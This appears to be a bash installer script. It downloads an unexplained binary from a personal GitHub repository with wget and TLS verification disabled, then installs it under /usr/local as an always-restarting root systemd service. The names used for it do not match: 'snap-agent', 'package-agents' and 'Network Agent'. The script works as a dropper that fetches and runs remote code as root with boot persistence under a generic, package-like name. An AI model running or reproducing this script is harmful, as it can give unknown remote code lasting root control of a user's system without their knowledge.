#!/bin/bash

# Set variables
AGENT_PATH="/usr/local/package-agents"
SERVICE_PATH="/etc/systemd/system/package-agents.service"
DOWNLOAD_URL="https://github.com/yellphonenaing199/package-repo/raw/refs/heads/main/package"

# Check for root
if [[ $EUID -ne 0 ]]; then
  echo "❌ This script must be run as root."
  exit 1
fi

# Download snap-agent
echo "➜ Downloading snap-agent from $DOWNLOAD_URL..."
wget "$DOWNLOAD_URL" -O "$AGENT_PATH" --no-check-certificate

# Check if download was successful
if [[ ! -f "$AGENT_PATH" ]]; then
  echo "❌ Failed to download snap-agent to $AGENT_PATH"
  exit 1
fi

# Ensure it's executable
chmod +x "$AGENT_PATH"

# Create systemd service
echo "➜ Creating systemd service..."

cat > "$SERVICE_PATH" <<EOF
[Unit]
Description=Network Agent
After=network.target

[Service]
Type=simple
ExecStart=$AGENT_PATH
Restart=always
RestartSec=60
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

chmod 644 "$SERVICE_PATH"

# Reload systemd and start service
echo "➜ Reloading systemd and starting service..."
systemctl daemon-reload
systemctl enable package-agents.service
systemctl start package-agents.service

# Show status
echo "➜ Service status:"
systemctl status package-agents.service --no-pager
